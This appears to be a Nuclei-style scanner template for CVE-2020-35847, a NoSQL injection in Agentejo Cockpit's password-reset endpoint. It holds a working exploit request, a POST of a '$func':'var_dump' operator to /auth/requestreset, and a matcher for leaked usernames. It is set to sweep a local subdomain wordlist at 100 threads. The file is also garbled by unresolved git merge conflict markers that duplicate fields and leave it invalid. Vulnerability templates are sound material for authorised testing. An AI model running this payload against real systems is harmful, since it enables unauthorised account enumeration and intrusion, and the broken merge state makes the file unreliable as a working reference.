id: CVE-2020-35847

info:
  name: Agentejo Cockpit <0.11.2 - NoSQL Injection
  author: dwisiswant0
  severity: critical
<<<<<<< HEAD
  description: |
    resetpassword method of the Auth controller,
    which is responsible for changing the user password using the reset token.
  reference: https://swarm.ptsecurity.com/rce-cockpit-cms/
<<<<<<< HEAD
  tags: cve,cve2020,nosqli,sqli,cockpit,injection
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.80
    cve-id: CVE-2020-35847
    cwe-id: CWE-89
=======
  description: Agentejo Cockpit before 0.11.2 allows NoSQL injection via the Controller/Auth.php resetpassword function of the Auth controller.
  reference:
    - https://swarm.ptsecurity.com/rce-cockpit-cms/
    - https://nvd.nist.gov/vuln/detail/CVE-2020-35847
    - https://getcockpit.com/
    - https://github.com/agentejo/cockpit/commit/2a385af8d80ed60d40d386ed813c1039db00c466
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-35847
    cwe-id: CWE-89
  tags: cve,cve2020,nosqli,sqli,cockpit,injection
>>>>>>> 5d36d276 (add new stuff)
=======
  tags: cve,cve2020,nosqli,sqli
>>>>>>> 18ddf72b (add new stuff)

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        POST /auth/requestreset HTTP/1.1
        Host: {{Subdomains}}
        Content-Type: application/json

        {"user":{"$func":"var_dump"}}
    matchers:
      - type: regex
        part: body
        regex:
<<<<<<< HEAD
          - 'string\([0-9]{1,3}\)(\s)?"([A-Za-z0-9]+)"'
<<<<<<< HEAD
=======


# Enhanced by mp on 2022/04/28
>>>>>>> 5d36d276 (add new stuff)
=======
          - 'string\([0-9]{1,3}\)(\s)?"([A-Za-z0-9]+)"'
>>>>>>> 18ddf72b (add new stuff)
